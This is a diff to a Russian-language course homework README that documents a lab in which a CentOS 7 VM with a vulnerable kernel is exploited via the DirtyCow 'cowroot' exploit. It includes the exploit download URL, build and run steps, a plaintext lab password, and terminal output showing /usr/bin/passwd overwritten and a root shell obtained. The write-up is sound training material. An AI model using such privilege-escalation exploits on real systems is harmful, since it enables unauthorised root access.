@@ -5,6 +5,55 @@
 -----------------------------------------------
 
 1. Centos
+в vagrantfile плейбуками ansible 
+- поднимаем vm Centos 7 из образа с уязвимым ядром 3.10.0-327 (nodevictim, 192.168.99.101)
+- создаем на vm nodevictim пользователя otus с обычными правами и паролем vic!!vak
+- загружаем исходник эксплоита cowroot из [источника](https://gist.githubusercontent.com/joshuaskorich/86c90e12436c873e4a06bd64b461cc43/raw/71db45f5b97c8e4ed00f1193e578a77f90dabbdd/cowroot.c) в домашнюю папку пользователя otus
+- собираем эксплоит из исходника (output=dirty)
+- переводим selinux в permissive mode
+- заходим ssh под пользователем otus, запускаем эксплоит, убеждаемся, что у нас права рута (id)
+<code>
+
+    djabber@xJabber:~/projects/otus/IS/hw03$ ssh -i ./ansible/nodebuntu/ssh/otus3_key otus@192.168.99.101
+
+    Warning: Permanently added '192.168.99.101' (ECDSA) to the list of known hosts.
+
+    Last login: Thu Feb 27 12:08:08 2020 from 192.168.99.1
+
+    [otus@nodevictim ~]$ ./dirty
+
+    DirtyCow root privilege escalation
+
+    Backing up /usr/bin/passwd to /tmp/bak
+
+    cp: невозможно создать обычный файл «/tmp/bak»: Отказано в доступе
+
+    Size of binary: 27832
+
+    Racing, this may take a while..
+
+    /usr/bin/passwd overwritten
+
+    Popping root shell.
+
+    Don't forget to restore /tmp/bak
+
+    thread stopped
+
+    thread stopped
+
+    [root@nodevictim otus]# id
+
+    uid=0(root) gid=1001(otus) groups=1001(otus) context=unconfined_u:unconfined_r:passwd_t:s0-s0:c0.c1023
+
+    [root@nodevictim otus]# uname -r
+
+    3.10.0-327.13.1.el7.x86_64
+
+    [root@nodevictim otus]# 
+
+</code>
+
 2. Ubuntu
 3. Metasploit
 - использовал материалы
@@ -186,5 +235,5 @@ https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit
     Linux nodebuntu 4.4.0-42-generic #62-Ubuntu SMP Fri Oct 7 23:11:45 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
     id
     uid=0(root) gid=0(root) groups=0(root),1001(otus)
-    
+
 </code>
